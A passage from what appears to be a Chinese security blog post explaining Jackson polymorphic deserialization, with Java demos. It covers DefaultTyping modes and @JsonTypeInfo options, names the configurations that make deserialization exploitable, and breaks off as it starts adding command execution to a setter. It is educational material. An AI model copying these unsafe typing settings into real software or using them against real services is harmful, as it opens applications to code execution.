class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_CONCRETE_AND_ARRAYS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token string">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"[LHacker;"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token number">0</span>w0<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">LHacker</span><span class="token punctuation">;</span><span class="token annotation punctuation">@5cb9f472</span><span class="token punctuation">,</span> <span class="token class-name">MySex</span><span class="token annotation punctuation">@cb644e</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>类名变成了 <code>&quot;[L&quot;+类名+&quot;;&quot;</code></p><hr><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><blockquote><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化</p></blockquote><p>给 Person 加上 Hacker 属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token class-name">Hacker</span> hacker<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">,</span> hacker <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> hacker<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化与反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NON_FINAL_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span>hacker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置NON_FINAL  </span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token string">"Person"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"MySex"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"hacker"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"Hacker"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>Person.age=<span class="token number">6</span><span class="token punctuation">,</span> Person.name=0w0<span class="token punctuation">,</span> Hacker@42dafa95<span class="token punctuation">,</span> MySex@6500df86<span class="token punctuation">,</span> Hacker@402a079c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功对非 final 的 hacker 属性进行序列化和反序列化</p><hr><h3 id="JsonTypeInfo-注解"><a href="#JsonTypeInfo-注解" class="headerlink" title="@JsonTypeInfo 注解"></a>@JsonTypeInfo 注解</h3><p><code>@JsonTypeInfo</code> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NONE</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">MINIMAL_CLASS</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">CUSTOM</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>默认设置</p><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>起一个 User 类，把 Hacker 类移到 com.example 下，指定注解</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@JsonTypeInfo</span><span class="token punctuation">(</span>use <span class="token operator">=</span> <span class="token class-name">JsonTypeInfo<span class="token punctuation">.</span>Id</span><span class="token punctuation">.</span><span class="token constant">NAME</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"com.example.User&#123;"</span> <span class="token operator">+</span>                <span class="token string">"username='"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", password='"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>                <span class="token string">", object="</span> <span class="token operator">+</span> object <span class="token operator">+</span>                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后序列化和反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Hacker</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonTypeInfo_Id_NONE_Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"0w0"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">"******"</span><span class="token punctuation">;</span>        u<span class="token punctuation">.</span>object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@class"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@25bbe1b6<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>相比 NONE 注解时，object 属性中多了 <code>&quot;@class&quot;:&quot;com.example.Hacker&quot;</code>，即含有具体的类的信息，同时反序列化出来了 object 属性 Hacker 类对象，即能够成功对指定类型进行序列化和反序列化</p><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过 @class 的方式指定相关类，并进行相关调用</p><hr><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改注解值为<code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>输出：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"******"</span><span class="token punctuation">,</span><span class="token property">"object"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@c"</span><span class="token operator">:</span><span class="token string">"com.example.Hacker"</span><span class="token punctuation">,</span><span class="token property">"skill"</span><span class="token operator">:</span><span class="token string">"havefun"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>User<span class="token punctuation">&#123;</span>username='0w0'<span class="token punctuation">,</span> password='******'<span class="token punctuation">,</span> object=com.example.Hacker@69ea3742<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>object属性中 <code>&quot;@c&quot;:&quot;com.example.Hacker&quot;</code>，即使用 @c 替代了 @class</p><p>官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似</p><hr><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改注解值为<code>JsonTypeInfo.Id.NAME</code></p><p>输出：</p><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241224172923965.png" alt="image-20241224172923965"></p><p>object属性中<code>&quot;@type&quot;:&quot;Hacker&quot;</code>，乍一看没什么问题，但实际上没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的</p><hr><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>直接运行会抛出异常，需要用户自定义来使用</p><br><p>那么可触发反序列化的注解就两个：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><hr><h2 id="反序列化中类属性方法的调用"><a href="#反序列化中类属性方法的调用" class="headerlink" title="反序列化中类属性方法的调用"></a>反序列化中类属性方法的调用</h2><p>整个 User2 类，加上 setter 和 getter</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化与反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User2</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User2</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225000040426.png" alt="image-20241225000040426"></p><p>可以看到序列化会调用 getter，而反序列化会调用构造方法和 setter，和 fastjson 类似</p><br><hr><h1 id="Jackson反序列化漏洞demo"><a href="#Jackson反序列化漏洞demo" class="headerlink" title="Jackson反序列化漏洞demo"></a>Jackson反序列化漏洞demo</h1><p>满足下面三个条件之一即存在 Jackson 反序列化漏洞：</p><ul><li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li></ul><p>由之前的结论知道，当使用的 JacksonPolymorphicDeserialization 机制配置有问题时，Jackson 反序列化就会调用属性所属类的构造函数和 setter 方法。</p><p>而如果该构造函数或 setter 方法存在危险操作，那么就存在 Jackson 反序列化漏洞。</p><h2 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h2><p>当要进行反序列化的类的属性所属类的构造函数或 setter 方法本身存在漏洞时，这种场景存在 Jackson 反序列化漏洞，实际场景几乎不可能存在这种好事</p><p>直接修改 MySex 类的 setSex ()方法，在其中添加命令执行操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token 